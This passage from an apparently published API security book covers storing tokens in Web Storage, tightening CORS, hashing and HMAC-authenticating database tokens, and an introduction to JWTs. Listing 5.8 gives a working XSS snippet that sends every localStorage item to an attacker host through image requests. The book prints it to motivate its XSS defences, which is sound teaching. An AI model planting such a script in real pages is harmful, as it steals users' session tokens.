standard way to communi- cate  tokens  from  the  client  to  the  API,  and  to  prompt  for  tokens  when  not supplied.   Cookies can be replaced on the client by the Web Storage API.  Web  Storage  is  simple  to  use,  especially  when  compared  with  how  hard  it  was  to extract  a  cookie  in  JavaScript.  Browsers  that  support  the  Web  Storage  API,  which includes most browsers in current use, add two new fields to the standard JavaScript window object:   The sessionStorage object can be used to store data until the browser window   The localStorage object stores data until it is explicitly deleted, saving the data  or tab is closed.   even over browser restarts.  Although similar to session cookies, sessionStorage is not shared between browser tabs or windows; each tab gets its own storage. Although this can be useful, if you use   Tokens without cookies  165  The Bearer authentication scheme can be used to send tokens and prompt for a token.  API server  Token store  Web browser client  Web  storage  Authorization: Bearer  Request  Response  JSON   WWW-Authenticate  Tokens can be stored in Web Storage instead of cookies.  Token state can be manually stored in a backend database or cache.  Figure 5.4 Cookies can be replaced by Web Storage for storing tokens on the client. The  Bearer authentication scheme provides a standard way to communicate tokens from the  client to the API, and a token store can be manually implemented on the backend.  sessionStorage to store authentication tokens then the user will be forced to login again every time they open a new tab and logging out of one tab will not log them out of the others. For this reason, it is more convenient to store tokens in localStorage instead.    Each  object  implements  the  same  Storage  interface  that  defines  setItem key, value , getItem key , and removeItem key  methods to manipulate key-value pairs in that storage. Each storage object is implicitly scoped to the origin of the script that calls the API, so a script from example.com will see a completely different copy of the storage to a script from example.org.  TIP If you  want  scripts  from  two  sibling  sub-domains  to  share  storage,  you can  set  the  document.domain  field  to  a  common  parent  domain  in  both scripts. Both scripts must explicitly set the document.domain, otherwise it will be  ignored. For example, if a  script  from a.example.com and a  script  from b.example.com  both  set  document.domain  to  example.com,  then  they  will share Web Storage. This is allowed only for a valid parent domain of the script origin, and you cannot set it to a top-level domain like .com or .org. Setting the document.domain field also instructs the browser to ignore the port when comparing origins.  To update the login UI to set the token in local storage rather than a cookie, open login.js in your editor and locate the line that currently sets the cookie:      document.cookie = 'token=' + json.token +         ';Secure;SameSite=strict';   166  CHAPTER 5 Modern token-based authentication  Remove that line and replace it with the following line to set the token in local storage instead:      localStorage.setItem 'token', json.token ;  Now open natter.js and find the line that reads the token from a cookie. Delete that line and the getCookie function, and replace it with the following:      let token = localStorage.getItem 'token' ;  That is all it takes to use the Web Storage API. If the token expires, then the API will return a 401 response, which will cause the UI to redirect to the login page. Once the user has logged in again, the token in local storage will be overwritten with the new version, so you do not need to do anything else. Restart the UI and check that every- thing is working as expected.  5.2.5 Updating the CORS filter  Now that your API no longer needs cookies to function, you can tighten up the CORS settings. Though you are explicitly sending credentials on each request, the browser is not having to add any of its own credentials  cookies , so you can remove the Access- Control-Allow-Credentials headers to stop the browser sending any. If you wanted, you could now also set the allowed origins header to * to allow requests from any ori- gin, but it is best to keep it locked down unless you really want the API to be open to all comers. You can also remove X-CSRF-Token from the allowed headers list. Open CorsFilter.java in your editor and update the handle method to remove these extra headers, as shown in listing 5.7.  Listing 5.7 Updated CORS filter  @Override public void handle Request request, Response response  {     var origin = request.headers "Origin" ;     if  origin != null && allowedOrigins.contains origin   {         response.header "Access-Control-Allow-Origin", origin ;             response.header "Vary", "Origin" ;                              }  Remove the  Access-Control- Allow-Credentials  header.      if  isPreflightRequest request   {         if  origin == null  !allowedOrigins.contains origin   {             halt 403 ;         }          response.header "Access-Control-Allow-Headers",                 "Content-Type, Authorization" ;             response.header "Access-Control-Allow-Methods",                 "GET, POST, DELETE" ;         halt 204 ;     } }  Remove X-CSRF-Token  from the allowed  headers.   5.2.6  Tokens without cookies  167  Because the API is no longer allowing clients to send cookies on requests, you must also update the login UI to not enable credentials mode on its fetch request. If you remember from earlier, you had to enable this so that the browser respected the Set- Cookie header on the response. If you leave this mode enabled but with credentials mode rejected by CORS, then the browser will completely block the request and you will no longer be able to login. Open login.js in your editor and remove the line that requests credentials mode for the request:      credentials: 'include',  Restart the API and UI again and check that everything is still working. If it does not work, you may need to clear your browser cache to pick up the latest version of the login.js script. Starting a fresh Incognito Private Browsing page is the simplest way to do this.3  XSS attacks on Web Storage Storing tokens in Web Storage is much easier to manage from JavaScript, and it elimi- nates the CSRF attacks that impact session cookies, because the browser is no longer automatically adding tokens to requests for us. But while the session cookie could be marked  as  HttpOnly  to  prevent  it  being  accessible  from  JavaScript,  Web  Storage objects are only accessible from JavaScript and so the same protection is not available. This can make Web Storage more susceptible to XSS exfiltration attacks, although Web Storage  is  only  accessible  to  scripts  running  from  the  same origin  while  cookies  are available to scripts from the same domain or any sub-domain by default.  DEFINITION Exfiltration is the act of stealing tokens and sensitive data from a page and sending them to the attacker without the victim being aware. The attacker can then use the stolen tokens to log in as the user from the attacker’s own device.  If an attacker can exploit an XSS attack  chapter 2  against a browser-based client of your API, then they can easily loop through the contents of Web Storage and create an img tag for each item with the src attribute, pointing to an attacker-controlled web- site to extract the contents, as illustrated in figure 5.5.   Most browsers will eagerly load an image source URL, without the img even being added to the page,4 allowing the attacker to steal tokens covertly with no visible indica- tion to the user. Listing 5.8 shows an example of this kind of attack, and how little code is required to carry it out.         3 Some older versions of Safari would disable local storage in private browsing mode, but this has been fixed  since version 12. I first learned about this technique from Jim Manico, founder of Manicode Security  https:  manicode.com .  4   168  CHAPTER 5 Modern token-based authentication  The attacker XSS script queries Web storage for all tokens.  Web browser  Web storage  xyz...  Attacker script     https:  attacker.x?token=xyz . . .  Attacker website  It creates image tags for each token, pointing at an attacker-controlled website.  The img URL includes the token allowing the attacker to store it on the website.  Figure 5.5 An attacker can exploit an XSS vulnerability to steal tokens from  Web Storage. By creating image elements, the attacker can exfiltrate the  tokens without any visible indication to the user.  Listing 5.8 Covert exfiltration of Web Storage  for  var i = 0; i < localStorage.length; ++i  {        var key = localStorage.key i ;                     var img = document.createElement 'img' ;            img.setAttribute 'src',                                 'https:  evil.example.com exfil?key=' +                encodeURIComponent key  + '&value=' +                         encodeURIComponent localStorage.getItem key   ;    }  Loop through every  element in localStorage.  Encode the key and value into the src URL to send them to the attacker.  Construct an  img element with  the src element  pointing to an  attacker- controlled site.  Although using HttpOnly cookies can protect against this attack, XSS attacks under- mine  the  security  of  all  forms  of  web  browser  authentication  technologies.  If  the attacker cannot extract the token and exfiltrate it to their own device, they will instead use the XSS exploit to execute the requests they want to perform directly from within the victim’s browser as shown in figure 5.6. Such requests will appear to the API to come  from  the  legitimate  UI,  and  so  would  also  defeat  any  CSRF  defenses.  While more complex, these kinds of attacks are now commonplace using frameworks such as the Browser Exploitation Framework  https:  beefproject.com , which allow sophisti- cated remote control of a victim’s browser through an XSS attack.   NOTE There is no reasonable defense if an attacker can exploit XSS, so elim- inating  XSS  vulnerabilities  from  your  UI  must  always  be  your  priority.  See chapter 2 for advice on preventing XSS attacks.   Tokens without cookies  169  Web browser  Cookies  xyz...  Attacker script  Cookie: xyz . . .  Victim API  The attacker script receives requests from the attacker over a CORS connection to the attacker’s server.  Attacker API  The script then makes requests to the victim API. The browser will include cookies as they appear to come from the same origin.  Figure 5.6 An XSS exploit can be used to proxy requests from the attacker through the  user’s browser to the API of the victim. Because the XSS script appears to be from the  same origin as the API, the browser will include all cookies and the script can do anything.  Chapter 2 covered general defenses against XSS attacks in a REST API. Although a more detailed discussion of XSS is out of scope for this book  because it is primarily an attack against a web UI rather than an API , two technologies are worth mention- ing because they provide significant hardening against XSS:   The  Content-Security-Policy  header   CSP ,  mentioned  briefly  in  chapter  2,  pro- vides fine-grained control over which scripts and other resources can be loaded by a page and what they are allowed to do. Mozilla Developer Network has a good introduction to CSP at https:  developer.mozilla.org en-US docs Web  HTTP CSP.   An experimental proposal from Google called Trusted Types aims to completely eliminate  DOM-based  XSS  attacks.  DOM-based  XSS  occurs  when  trusted  Java- Script code accidentally allows user-supplied HTML to be injected into the DOM, such  as  when  assigning  user  input  to  the  .innerHTML  attribute  of  an  existing element. DOM-based XSS is notoriously difficult to prevent as there are many ways  that  this  can  occur,  not  all  of  which  are  obvious  from  inspection.  The Trusted  Types  proposal  allows  policies  to  be  installed  that  prevent  arbitrary strings from being assigned to these vulnerable attributes. See https:  developers .google.com web updates 2019 02 trusted-types for more information.

They can not only view any sensitive data stored with the tokens, but also use those tokens to access your API. Because the database contains tokens for every authenti- cated user, the impact of such a compromise is much more severe than compromising a single user’s token. As a first step, you should separate the database server from the API and ensure that the database is not directly accessible by external clients. Commu- nication between the database and the API should be secured with TLS. Even if you do this, there are still many potential threats against the database, as shown in figure 5.7. If  an  attacker  gains  read  access  to  the  database,  such  as  through  a  SQL  injection attack, they can steal tokens and use them to access the API. If they gain write access, then they can insert new tokens granting themselves access or alter existing tokens to increase  their  access.  Finally,  if  they  gain  delete  access  then  they  can  revoke  other users’ tokens, denying them access to the API.  5.3.1 Hashing database tokens  Authentication tokens are credentials that allow access to a user’s account, just like a password. In chapter 3, you learned to hash passwords to protect them in case the user  database  is  ever  compromised.  You  should  do  the  same  for  authentication tokens,  for  the  same  reason.  If  an  attacker  ever  compromises  the  token  database, they can immediately use all the login tokens for any user that is currently logged in. Unlike user passwords, authentication tokens have high entropy, so you don’t need to use an expensive password hashing algorithm like Scrypt. Instead you can use a fast, cryptographic hash function such as SHA-256 that you used for generating anti-CSRF tokens in chapter 4.   Hardening database token storage  171  Trust boundaries  Write access allows new tokens to be injected or existing tokens to be modiﬁed.  Possible SQL injection attacks  Datacenter  API account  DBMS account  API  clients  API server  Token store  TLS  Read access allows tokens to be stolen and then replayed to the API.  Delete rights would allow other users’ tokens to be destroyed.  Figure 5.7 A database token store is subject to several threats, even if you secure the communi- cations between the API and the database using TLS. An attacker may gain direct access to the  database or via an injection attack. Read access allows the attacker to steal tokens and gain access  to the API as any user. Write access allows them to create fake tokens or alter their own token. If  they gain delete access, then they can delete other users’ tokens, denying them access.  Listing 5.9 shows how to add token hashing to the DatabaseTokenStore by reusing the sha256   method you added to the CookieTokenStore in chapter 4. The token ID given to the client is the original, un-hashed random string, but the value stored in  the  database  is  the  SHA-256  hash  of  that  string.  Because  SHA-256  is  a  one-way hash function, an attacker that gains access to the database won’t be able to reverse the hash function to determine the real token IDs. To read or revoke the token, you simply hash the value provided by the user and use that to look up the record in the database.  Listing 5.9 Hashing database tokens  @Override public String create Request request, Token token  {     var tokenId = randomId  ;     var attrs = new JSONObject token.attributes .toString  ;      database.updateUnique "INSERT INTO " +         "tokens token_id, user_id, expiry, attributes  " +         "VALUES ?, ?, ?, ? ", hash tokenId , token.username,                  token.expiry, attrs ;  Hash the  provided token  when storing  or looking up in  the database.   172  CHAPTER 5 Modern token-based authentication      return tokenId; }  @Override public Optional  read Request request, String tokenId  {     return database.findOptional this::readToken,             "SELECT user_id, expiry, attributes " +             "FROM tokens WHERE token_id = ?", hash tokenId  ;  }  @Override public void revoke Request request, String tokenId  {     database.update "DELETE FROM tokens WHERE token_id = ?",             hash tokenId  ;                                    }  private String hash String tokenId  {                  var hash = CookieTokenStore.sha256 tokenId ;       return Base64url.encode hash ;                 }                                                   Reuse the SHA-256  method from the  CookieTokenStore  for the hash.  Hash the  provided token  when storing  or looking up in  the database.  5.3.2  Authenticating tokens with HMAC Although effective against token theft, simple hashing does not prevent an attacker with write access from inserting a fake token that gives them access to another user’s account.  Most  databases  are  also  not  designed  to  provide  constant-time  equality comparisons, so database lookups can be vulnerable to timing attacks like those dis- cussed in chapter 4. You can eliminate both issues by calculating a message authentica- tion code  MAC , such as the standard hash-based MAC  HMAC . HMAC works like a normal  cryptographic  hash  function,  but  incorporates  a  secret  key  known  only  to the API server.   DEFINITION A message authentication code  MAC  is an algorithm for comput- ing a short fixed-length authentication tag from a message and a secret key. A user with the same secret key will be able to compute the same tag from the same message, but any change in the message will result in a completely dif- ferent tag. An attacker without access to the secret cannot compute a correct tag for any message. HMAC  hash-based MAC  is a widely used secure MAC based  on  a  cryptographic  hash  function.  For  example,  HMAC-SHA-256  is HMAC using the SHA-256 hash function.  The output of the HMAC function is a short authentication tag that can be appended to the token as shown in figure 5.8. An attacker without access to the secret key can’t calculate the correct tag for a token, and the tag will change if even a single bit of the token ID is altered, preventing them from tampering with a token or faking new ones.  In this section, you’ll authenticate the database tokens with the widely used HMAC- SHA256 algorithm. HMAC-SHA256 takes a 256-bit secret key and an input message and produces a 256-bit authentication tag. There are many wrong ways to construct a secure MAC from a hash function, so rather than trying to build your own solution   Hardening database token storage  173  The random database token ID is encoded with Base64.

The HMAC tag is encoded and appended to the token.  Figure 5.8 A token can be protected against theft and forgery by computing  a HMAC authentication tag using a secret key. The token returned from the  database is passed to the HMAC-SHA256 function along with the secret key.  The output authentication tag is encoded and appended to the database ID to  return to the client. Only the original token ID is stored in the database, and  an attacker without access to the secret key cannot calculate a valid  authentication tag.  you  should  always  use  HMAC,  which  has  been  extensively  studied  by  experts.  For more information about secure MAC algorithms, I recommend Serious Cryptography by Jean-Philippe Aumasson  No Starch Press, 2017 .   Rather than storing the authentication tag in the database alongside the token ID, you’ll instead leave that as-is. Before you return the token ID to the client, you’ll com- pute the HMAC tag and append it to the encoded token, as shown in figure 5.9. When the client sends a request back to the API including the token, you can validate the authentication tag. If it is valid, then the tag is stripped off and the original token ID passed to the database token store. If the tag is invalid or missing, then the request can  be  immediately  rejected  without  any  database  lookups,  preventing  any  timing attacks. Because an attacker with access to the database cannot create a valid authenti- cation  tag,  they  can’t  use  any  stolen  tokens  to  access  the  API  and  they  can’t  create their own tokens by inserting records into the database.   Listing 5.10 shows the code for computing the HMAC tag and appending it to the token. You can implement this as a new HmacTokenStore implementation that can be   174  CHAPTER 5 Modern token-based authentication  API server boundary  tokenId.tag  store  tokenId  store  HMAC token  Database token  Token  database  tokenId: data  Secret key  The token given to the client has an authentication tag.  The token in the database is missing the tag.  Figure 5.9 The database token ID is left untouched, but an HMAC authentication tag is  computed and attached to the token ID returned to API clients. When a token is presented to  the API, the authentication tag is first validated and then stripped from the token ID before  passing it to the database token store. If the authentication tag is invalid, then the token is  rejected before any database lookup occurs.  wrapped around the DatabaseTokenStore to add the protections, as HMAC turns out to be useful for other token stores as you will see in the next chapter. The HMAC tag can be implement using the javax.crypto.Mac class in Java, using a Key object passed to your constructor. You’ll see soon how to generate the key. Create a new file Hmac- TokenStore.java alongside the existing JsonTokenStore.java and type in the contents of listing 5.10.  Listing 5.10 Computing a HMAC tag for a new token  package com.manning.apisecurityinaction.token;  import spark.Request;  import javax.crypto.Mac; import java.nio.charset.StandardCharsets; import java.security.*; import java.util.*;  public class HmacTokenStore implements TokenStore {      private final TokenStore delegate;                             private final Key macKey;                                       public HmacTokenStore TokenStore delegate, Key macKey  {           this.delegate = delegate;         this.macKey = macKey;     }  Pass in the real  TokenStore  implementation  and the secret key  to the constructor.   Hardening database token storage  175  Call the real TokenStore to generate the token ID, then use HMAC to calculate the tag.      @Override     public String create Request request, Token token  {         var tokenId = delegate.create request, token ;             var tag = hmac tokenId ;                                    return tokenId + '.' + Base64url.encode tag ;         }      private byte[] hmac String tokenId  {         try {             var mac = Mac.getInstance macKey.getAlgorithm   ;               mac.init macKey ;                                               return mac.doFinal                                                      tokenId.getBytes StandardCharsets.UTF_8  ;          } catch  GeneralSecurityException e  {             throw new RuntimeException e ;         }     }      @Override     public Optional  read Request request, String tokenId  {         return Optional.empty  ;    To be written     } }  Concatenate the  original token ID  with the encoded tag  as the new token ID.  Use the javax  .crypto.Mac class  to compute the  HMAC-SHA256 tag.  When the client presents the token back to the API, you extract the tag from the pre- sented  token  and  recompute  the  expected  tag  from  the  secret  and  the  rest  of  the token ID. If they match then the token is authentic, and you pass it through to the DatabaseTokenStore. If they don’t match, then the request is rejected. Listing 5.11 shows the code to validate the tag. First you need to extract the tag from the token and decode  it.  You  then  compute  the  correct  tag  just  as  you  did  when  creating  a  fresh token and check the two are equal.  WARNING As you learned in chapter 4 when validating anti-CSRF tokens, it is important  to  always  use  a  constant-time  equality  when  comparing  a  secret value  the correct authentication tag  against a user-supplied value. Timing attacks against HMAC tag validation are a common vulnerability, so it is criti- cal  that  you  use  MessageDigest.isEqual  or  an  equivalent  constant-time equality function.  Listing 5.11 Validating the HMAC tag  @Override public Optional  read Request request, String tokenId  {     var index = tokenId.lastIndexOf '.' ;                 if  index == -1  {                                        return Optional.empty  ;                          }                                                     var realTokenId = tokenId.substring 0, index ;     Extract the tag from the end  of the token ID. If not found,  then reject the request.   176  CHAPTER 5 Modern token-based authentication      var provided = Base64url.decode tokenId.substring index + 1  ;          var computed = hmac realTokenId ;                                        if  !MessageDigest.isEqual provided, computed   {            return Optional.empty  ;     }  Decode the tag from the token and compute the correct tag.      return delegate.read request, realTokenId ;    } Compare the two tags with a  constant-time equality check.  If the tag is valid, then call  the real token store with  the original token ID.  GENERATING THE KEY The key used for HMAC-SHA256 is just a 32-byte random value, so you could generate one using a SecureRandom just like you currently do for database token IDs. But many APIs will be implemented using more than one server to handle load from large num- bers of clients, and requests from the same client may be routed to any server, so they all  need  to  use  the  same  key.  Otherwise,  a  token  generated  on  one  server  will  be rejected as invalid by a different server with a different key. Even if you have only a sin- gle  server,  if  you  ever  restart  it,  then  it  will  reject  tokens  issued  before  it  restarted unless the key is the same. To get around these problems, you can store the key in an external keystore that can be loaded by each server.  DEFINITION A  keystore  is  an  encrypted  file  that  contains  cryptographic  keys and  TLS  certificates  used  by  your  API.  A  keystore  is  usually  protected  by  a password.   Java supports  loading keys from keystores using the  java.security.KeyStore  class, and you can create a keystore using the keytool command shipped with the JDK. Java provides several keystore formats, but you should use the PKCS 12 format  https:   tools.ietf.org html rfc7292   because  that  is  the  most  secure  option  supported  by keytool.    Open a terminal window and navigate to the root folder of the Natter API project.  Then run the following command to generate a keystore with a 256-bit HMAC key:  keytool -genseckey -keyalg HmacSHA256 -keysize 256 \          -alias hmac-key -keystore keystore.p12 \     -storetype PKCS12 \            -storepass changeit       Generate a  256-bit key for  HMAC-SHA256.  Store it in a  PKCS12  keystore.  Set a password for the keystore— ideally better than this one!  You can the load the keystore in your main method and then extract the key to pass to the  HmacTokenStore.  Rather  than  hard-code  the  keystore  password  in  the  source code, where it is accessible to anyone who can access the source code, you can pass it in from a system property or environment variable. This ensures that the developers writing the API do not know the password used for the production environment. The   Hardening database token storage  177  password can then be used to unlock the keystore and to access the key itself.5 After you have loaded the key, you can then create the HmacKeyStore instance, as shown in listing 5.12. Open Main.java in your editor and find the lines that construct the DatabaseTokenStore and TokenController. Update them to match the listing.  Listing 5.12 Loading the HMAC key  Load the keystore password from a system property.  var keyPassword = System.getProperty "keystore.password",            "changeit" .toCharArray  ;                           var keyStore = KeyStore.getInstance "PKCS12" ;        keyStore.load new FileInputStream "keystore.p12" ,            keyPassword ;                                  Load the keystore, unlocking  it with the password.  var macKey = keyStore.getKey "hmac-key", keyPassword ;      var databaseTokenStore = new DatabaseTokenStore database ;         var tokenStore = new HmacTokenStore databaseTokenStore, macKey ;   var tokenController = new TokenController tokenStore ;  Get the HMAC key from the keystore,  using the password again.  Create the HmacTokenStore, passing in the DatabaseTokenStore and the HMAC key.  TRYING IT OUT Restart the API, adding -Dkeystore.password=changeit to the command line argu- ments, and you can see the update token format when you authenticate:  $ curl -H 'Content-Type: application json' \            -d '{"username":"test","password":"password"}' \      https:  localhost:4567 users                        {"username":"test"} $ curl -H 'Content-Type: application json' -u test:password \      -X POST https:  localhost:4567 sessions                        {"token":"OrosINwKcJs93WcujdzqGxK-d9s ➥ .wOaaXO4_yP4qtPmkOgphFob1HGB5X-bi0PNApBOa5nU"}  Create a  test user.  Log in to get a  token with the  HMAC tag.  If you try and use the token without the authentication tag, then it is rejected with a 401 response. The same happens if you try to alter any part of the token ID or the tag itself. Only the full token, with the tag, is accepted by the API.  5.3.3  Protecting sensitive attributes Suppose  that  your  tokens  include  sensitive  information  about  users  in  token  attri- butes, such as their location when they logged in. You might want to use these attri- butes  to  make  access  control  decisions,  such  as  disallowing  access  to  confidential documents if the token is suddenly used from a very different location. If an attacker  5 Some keystore formats support setting different passwords for each key, but PKCS 12 uses a single password  for the keystore and every key.   178  CHAPTER 5 Modern token-based authentication  gains read access to the database, they would learn the location of every user currently using the system, which would violate their expectation of privacy.   Encrypting database attributes One way to protect sensitive attributes in the database is by encrypting them. While many  databases  come  with  built-in  support  for  encryption,  and  some  commercial products can add this, these solutions typically only protect against attackers that gain access to the raw database file storage. Data returned from queries is transpar- ently decrypted by the database server, so this type of encryption does not protect against SQL injection or other attacks that target the database API. You can solve this by encrypting database records in your API before sending data to the database, and then decrypting the responses read from the database. Database encryption is a complex topic, especially if encrypted attributes need to be searchable, and could fill a book by itself. The open source CipherSweet library  https:  ciphersweet.parag- onie.com  provides the nearest thing to a complete solution that I am aware of, but it lacks a Java version at present. All searchable database encryption leaks some information about the encrypted val- ues, and a patient attacker may eventually be able to defeat any such scheme. For this reason, and the complexity, I recommend that developers concentrate on basic database access controls before investigating more complex solutions. You should still enable built-in database encryption if your database storage is hosted by a cloud provider or other third party, and you should always encrypt all database backups— many backup tools can do this for you. For readers that want to learn more, I’ve provided a heavily-commented version of the DatabaseTokenStore providing encryption and authentication of all token attributes, as well as blind indexing of usernames in a branch of the GitHub repository that accom- panies this book at http:  mng.bz 4B75.  The main threat to your token database is through injection attacks or logic errors in the API itself that allow a user to perform actions against the database that they should not be allowed to perform. This might be reading other users’ tokens or altering or deleting them. As discussed in chapter 2, use of prepared statements makes injection attacks much less likely. You reduced the risk even further in that chapter by using a database account with fewer permissions rather than the default administrator account. You can take this approach further to reduce the ability of attackers to exploit weak- nesses in your database storage, with two additional refinements:   You can create separate database accounts to perform destructive operations such as bulk deletion of expired tokens and deny those privileges to the database user used  for  running queries in  response  to  API  requests. An  attacker  that exploits  an  injection  attack  against  the API  is  then  much  more  limited  in  the damage they can perform. This split of database privileges into separate accounts can work well with the Command-Query Responsibility Segregation  CQRS; see https:   martinfowler.com bliki CQRS.html  API design pattern, in which a completely separate API is used for query operations compared to update operations.   Hardening database token storage  179   Many databases support row-level security policies that allow queries and updates to see a filtered view of database tables based on contextual information sup- plied  by  the  application.  For  example,  you  could  configure  a  policy  that restricts the tokens that can be viewed or updated to only those with a username attribute matching the current API user. This would prevent an attacker from exploiting an SQL vulnerability to view or modify any other user’s tokens. The H2 database used in this book does not support row-level security policies. See https:  www.postgresql.org docs current ddl-rowsecurity.html for how to con- figure row-level security policies for PostgreSQL as an example.

As described in section 5.3.2, this can reduce the damage that an SQL injection attack can cause.   Cross-origin API calls can be enabled for web clients using CORS. Enabling cookies on cross-origin calls is error-prone and becoming more difficult over time.  HTML  5  Web  Storage  provides  an  alternative  to  cookies  for  storing cookies directly.   Web Storage prevents CSRF attacks but can be more vulnerable to token exfil- tration via XSS. You should ensure that you prevent XSS attacks before moving to this token storage model.   The standard Bearer authentication scheme for HTTP can be used to transmit a  token  to  an  API,  and  to  prompt  for  one  if  not  supplied.  While  originally designed for OAuth2, the scheme is now widely used for other forms of tokens.  Authentication tokens should be hashed when stored in a database to prevent them being used if the database is compromised. Message authentication codes  MACs   can  be  used  to  protect  tokens  against  tampering  and  forgery.  Hash- based  MAC   HMAC   is  a  standard  secure  algorithm  for  constructing  a  MAC from a secure hash algorithm such as SHA-256.   Database access controls and row-level security policies can be used to further harden a database against attacks, limiting the damage that can be done. Data- base  encryption  can  be  used  to  protect  sensitive  attributes  but  is  a  complex topic with many failure cases.   Self-contained tokens and JWTs  This chapter covers  Scaling token-based authentication with   encrypted client-side storage   Protecting tokens with MACs and authenticated    Generating standard JSON Web Tokens  Handling token revocation when all the state is   encryption  on the client  You’ve shifted the Natter API over to using the database token store with tokens stored in Web Storage. The good news is that Natter is really taking off. Your user base has grown to millions of regular users. The bad news is that the token database is struggling to cope with this level of traffic. You’ve evaluated different database backends, but you’ve heard about stateless tokens that would allow you to get rid of the database entirely. Without a database slowing you down, Natter will be able to scale up as the user base continues to grow. In this chapter, you’ll implement self- contained tokens securely, and examine some of the security trade-offs compared to database-backed tokens. You’ll also learn about the JSON Web Token  JWT  stan- dard that is the most widely used token format today.  181   182  CHAPTER 6 Self-contained tokens and JWTs  6.1  DEFINITION JSON  Web  Tokens   JWTs, pronounced  “jots”   are  a standard  for- mat for self-contained security tokens. A JWT consists of a set of claims about a user represented as a JSON object, together with a header describing the format of the token. JWTs are cryptographically protected against tampering and can also be encrypted.  Storing token state on the client The idea behind stateless tokens is simple. Rather than store the token state in the database, you can instead encode that state directly into the token ID and send it to the client. For example, you could serialize the token fields into a JSON object, which you then Base64url-encode to create a string that you can use as the token ID. When the token is presented back to the API, you then simply decode the token and parse the JSON to recover the attributes of the session.    Listing 6.1 shows a JSON token store that does exactly that. It uses short keys for attributes, such as sub for the subject  username , and exp for the expiry time, to save space. These are standard JWT attributes, as you’ll learn in section 6.2.1. Leave the revoke method blank for now, you will come back to that shortly in section 6.5.

Anybody can log in to the API and then edit the encoded token in their browser to change their username or other security attributes! In fact, they can just create a brand-new token themselves without ever logging in. You can fix that by reusing the HmacTokenStore that you created in chapter 5, as shown in figure 6.1. By appending an authentication tag computed with a secret key known only to the API server, an attacker is prevented from either creat- ing a fake token or altering an existing one.   To enable HMAC-protected tokens, open Main.java in your editor and change the  code that constructs the DatabaseTokenStore to instead create a JsonTokenStore:  Construct the JsonTokenStore.      TokenStore tokenStore = new JsonTokenStore  ;         tokenStore = new HmacTokenStore tokenStore, macKey ;         var tokenController = new TokenController tokenStore ;  Wrap it in a  HmacTokenStore to  ensure authenticity.  You can try it out to see your first stateless token in action:  $ curl -H 'Content-Type: application json' -u test:password \   -X POST https:  localhost:4567 sessions {"token":"eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxNTU5NTgyMTI5LCJhdHRycyI6e319. ➥ INFgLC3cAhJ8DjzPgQfHBHvU_uItnFjt568mQ43V7YI"}   184  CHAPTER 6 Self-contained tokens and JWTs  {"sub":"test","exp":12345,...}  URL-safe Base64  JSON claims are encoded into URL-safe Base64 encoding.

The HMAC tag is then itself encoded into URL-safe Base64 format and appended to the  token, using a period as a separator.

There  may be more than one correct answer.  a Spoofing b Tampering c Repudiation d e Denial of service f Elevation of privilege  Information disclosure  The answer is at the end of the chapter.   JSON Web Tokens  185  6.2  JSON Web Tokens Authenticated client-side tokens have become very popular in recent years, thanks in part to the standardization of JSON Web Tokens in 2015. JWTs are very similar to the JSON tokens you have just produced, but have many more features:   A standard header format that contains metadata about the JWT, such as which  MAC or encryption algorithm was used.   A set of standard claims that can be used in the JSON content of the JWT, with defined meanings, such as exp to indicate the expiry time and sub for the sub- ject, just as you have been using.   A wide range of algorithms for authentication and encryption, as well as digital  signatures and public key encryption that are covered later in this book.   Because JWTs are standardized, they can be used with lots of existing tools, libraries, and services. JWT libraries exist for most programming languages now, and many API frameworks include built-in support for JWTs, making them an attractive format to  use.  The  OpenID  Connect   OIDC   authentication  protocol  that’s  discussed  in chapter  7  uses  JWTs  as  a  standard  format  to  convey  identity  claims  about  users between systems.  The JWT standards zoo While  JWT  itself  is  just  one  specification   https:  tools.ietf.org html rfc7519 ,  it builds on a collection of standards collectively known as JSON Object Signing and Encryption  JOSE . JOSE itself consists of several related standards:   JSON  Web  Signing   JWS,  https:  tools.ietf.org html rfc7515   defines  how  JSON objects can be authenticated with HMAC and digital signatures.   JSON Web Encryption  JWE, https:  tools.ietf.org html rfc7516  defines how  to encrypt JSON objects.   JSON  Web Key   JWK,  https:  tools.ietf.org html rfc7517  describes  a  stan-  dard format for cryptographic keys and related metadata in JSON.   JSON Web Algorithms  JWA, https:  tools.ietf.org html rfc7518  then speci-  fies signing and encryption algorithms to be used.  JOSE has been extended over the years by new specifications to add new algorithms and options. It is common to use JWT to refer to the whole collection of specifica- tions, although there are uses of JOSE beyond JWTs.  A  basic  authenticated  JWT  is  almost  exactly  like  the  HMAC-authenticated  JSON tokens that you produced in section 6.1.1, but with an additional JSON header that indicates the algorithm and other details of how the JWT was produced, as shown in figure 6.2. The Base64url-encoded format used for JWTs is known as the JWS Compact Serialization. JWS also defines another format, but the compact serialization is the most widely used for API tokens.   186  CHAPTER 6 Self-contained tokens and JWTs  Claims  eyJ0eXAiOiJKV1Qi.eyJzdWIiOiJ0.QlZiSNH2tt5sFTmfn  Header  HMAC tag  Figure 6.2 The JWS Compact Serialization  consists of three URL-safe Base64-encoded  parts, separated by periods. First comes  the header, then the payload or claims, and  finally the authentication tag or signature.  The values in this diagram have been  shortened for display purposes.  The flexibility of JWT is also its biggest weakness, as several attacks have been found in the past that exploit this flexibility. JOSE is a kit-of-parts design, allowing develop- ers to pick and choose from a wide variety of algorithms, and not all combinations of features are secure. For example, in 2015 the security researcher Tim McClean discovered vulnerabilities in many JWT libraries  http:  mng.bz awKz  in which an attacker could change the algorithm header in a JWT to influence how the recipient validated  the  token.  It  was  even  possible  to  change  it  to  the  value  none,  which instructed the JWT library to not validate the signature at all! These kinds of security flaws have led some people to argue that JWTs are inherently insecure due to the ease with which they can be misused, and the poor security of some of the standard algorithms.  PASETO: An alternative to JOSE The error-prone nature of the standards has led to the development of alternative for- mats intended to be used for many of the same purposes as JOSE but with fewer tricky implementation details and opportunities for misuse. One example is PASETO  https:  paseto.io , which provides either symmetric authenticated encryption or pub- lic key signed JSON objects, covering many of the same use-cases as the JOSE and JWT standards. The main difference from JOSE is that PASETO only allows a devel- oper to specify a format version. Each version uses a fixed set of cryptographic algo- rithms rather than allowing a wide choice of algorithms: version 1 requires widely implemented algorithms such as AES and RSA, while version 2 requires more modern but less widely implemented algorithms such as Ed25519. This gives an attacker much less scope to confuse the implementation and the chosen algorithms have few known weaknesses.  I’ll let you come to your own conclusions about whether to use JWTs. In this chapter you’ll see how to implement some of the features of JWTs from scratch, so you can decide if the extra complexity is worth it. There are many cases in which JWTs cannot be avoided, so I’ll point out security best practices and gotchas so that you can use them safely.      JSON Web Tokens  187  6.2.1  The standard JWT claims One  of  the  most  useful  parts  of  the  JWT  specification  is  the  standard 